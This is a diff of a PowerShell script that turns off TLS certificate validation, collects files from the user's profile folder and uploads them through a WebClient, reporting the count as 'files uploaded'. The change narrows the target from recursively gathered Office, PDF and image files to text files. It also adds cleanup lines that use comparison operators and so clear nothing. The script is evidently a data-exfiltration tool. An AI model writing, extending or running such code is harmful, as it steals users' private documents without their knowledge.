@@ -1,7 +1,8 @@
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; 
 $http = New-Object System.Net.WebClient; 
 
-$files = Get-ChildItem $ENV:USERPROFILE -Recurse -Include *.doc,*.pdf,*.gif,*.xls
+#$files = Get-ChildItem $ENV:USERPROFILE -Recurse -Include *.doc,*.pdf,*.gif,*.xls
+$files = Get-ChildItem $ENV:USERPROFILE -Include *.txt
 $i=0;
 
 foreach ($f in $files){
@@ -11,3 +12,9 @@ foreach ($f in $files){
 }
 
 echo $i files uploaded
+$f -eq $null;
+$response -eq $null;
+$outfile -eq $null;
+$files -eq $null;
+$http -eq $null;
+$i -eq $null;
